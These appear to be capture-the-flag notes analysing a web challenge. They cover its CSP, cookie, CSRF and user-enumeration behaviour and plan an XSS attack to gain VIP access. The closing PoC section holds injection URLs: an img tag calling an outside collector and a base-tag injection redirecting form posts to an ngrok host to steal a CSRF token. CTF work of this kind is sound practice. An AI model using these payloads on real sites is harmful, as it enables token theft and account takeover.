# Security Blog
We suspect that this cybersecurity blog is hiding some information related to
a 0-day vulnerability. We need you to infiltrate it, and get access to the VIP
area to recover its secrets. Good luck !

http://remote1.thcon.party:10701

## Features
- Registration Flow (Inscription)
- Login Flow (Inscription)
- Access Control (User & VIP)
- Commenting
- Submit URL for Bounty (Admin Views)
- Add VIP Member

## Notes

- /add_vip?message=XSS is injectable but it has a very strict CSP
  ```
  connect-src 'none'; font-src 'none'; frame-src 'none'; img-src * data:;
  manifest-src 'none'; media-src 'none'; object-src 'none'; script-src 'none';
  worker-src 'none'; style-src 'self'; frame-ancestors 'none';
  block-all-mixed-content;
  ```
- Auth cookie doesn't have SameSite set (default lax), but is HttpOnly
  This is an express cookie, any modification seems to break auth
  ```
  s:MeeJVf9aQkyY7zuL4GckyBVL_KqqvGpq.FSLd4Y9lOlQ4VGjExp6BdF9HGR77ilEVbvTemtIA4eI
  ```
- Adding a comment puts it in query param but not on page, blind xss?
- Can check for the existence of a user with the registration form, returns
  error `User alredy exists` when it does.
- POST /add_vip is only endpoint w/ CSRF
- No CORS headers indicate we _require_ an XSS to hit the endpoints
- /vip has different CSP set, just `default-src 'none'`

### Questions
- How does VIP status work?
- What other tags could we use to make the admin do something, meta, base?
    Base tag would change where the form POST goes to which would allow us to
    steal the csrf


## Possible Attacks
- Add self as VIP by making admin go to add_vip page with XSS
- Send manual exploit page with XSS, use it to do _sOmEtHiNg_, potentially
  iframe or open the VIP page somehow


## PoCs
*Image Injection*: makes remote request (no info with it tho)
http://remote1.thcon.party:10701/add_vip?message=<img+src%3d"https%3a//enf0fcnvqg15n.x.pipedream.net/img"+/>

*CSRF Exfill*: requires form to be submitted somehow
http://remote1.thcon.party:10701/add_vip?message=<base+href="https://d5beba4f0eb4.ngrok.io/">
